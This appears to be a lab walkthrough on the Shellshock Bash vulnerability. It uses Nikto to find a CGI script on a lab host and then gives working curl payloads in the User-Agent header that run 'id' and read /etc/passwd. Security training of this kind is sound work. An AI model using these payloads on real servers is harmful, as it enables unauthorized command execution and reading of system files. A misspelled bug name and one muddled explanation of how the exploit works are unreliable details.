Shellshock, also known as the Bashdoorx bug, is a security vulnerability in the Unix Bash shell. Discovered in 2014, it allows attackers to execute arbitrary commands by exploiting improperly handled environment variables. The vulnerability is caused by Bash incorrectly processing trailing strings after function definitions in environment variables, which can be used to inject and execute commands.
Shellshock can be detected by vulnerability scanning tools such as Nikto that check for Apache versions and the cgi_mod module (with CGI folder). Check for this vulnerability by noticing that a server uses an old Apache version and cgi_mod (with CGI folder) using nikto, a vulnerability scanner tool.

To displays the help information for Nikto, providing details about the various options and how to use them use the following command in FINAL machine:

`nikto -h`

Use:
`nikto -host 192.168.10.100`
![[Pasted image 20250728004905.png]]
After running a quick nikto scan to 192.168.10.100, the output shows that this machine might be vulnerable to Shellshock since it detects a cgi_bin/ directory containing a script called "stats".
The presence of the stats script in this directory indicates it is a CGI script designed to be executed by the server to generate dynamic content.

The Open Source Vulnerability Database (OSVDB) entry 3092 references CGI scripts that may allow shell command execution.

This makes _cgi-bin/stats_ a potential target for exploitation.
## Manual Exploitation

To test if the server is vulnerable, send a request using curl to the target machine, and try to execute the id command.

Use the following command to send the HTTP request:
`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://192.168.10.100/cgi-bin/stats`

You can dynamically execute and display different outputs based on the content of the User-Agent header. The script checks if the User-Agent header contains the string "id" and executes the corresponding command.
# Command Injection Attack
You can use another command to inject on the server. To display user information, use the following command:

`curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" http://192.168.10.100/cgi-bin/stats`
This command is an example of exploiting the Shellshock vulnerability by injecting a malicious User-Agent header to execute arbitrary commands on a vulnerable server.



